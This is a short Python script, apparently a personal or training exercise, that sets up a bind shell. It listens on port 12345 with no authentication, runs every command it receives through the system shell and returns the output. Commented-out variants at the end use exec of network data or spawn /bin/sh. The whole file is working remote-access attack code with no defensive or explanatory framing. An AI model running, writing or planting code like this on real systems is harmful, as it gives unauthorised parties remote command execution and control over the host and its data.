#!/usr/bin/python3.7
#
# Nicole Benoit (with liberal "borrowing" from others)
#
# Sep 16 2019  16:59:09.599 MST
#
#########################################
# Create a bind shell
#########################################

import socket
import subprocess

s = socket.socket()
ip_addr = ""
port = 12345

s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((ip_addr,int(port)))

s.listen(1)
(con,addr) = s.accept()

while True:
    p = subprocess.Popen(con.recv(128), shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)

    con.send(p.stdout.read() + p.stderr.read())

s.shutdown()
s.close()


# Diff code tries

# ip_addr = socket.gethostbyname(socket.gethostname())

# import threading
# if (con):
#     threading.start_new_thread(connection, (con,))

# p = subprocess.Popen([“/bin/sh”], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

# exec(con.recv(999))
# data = con.recv(128).strip()
# subprocess.call(data.decode())
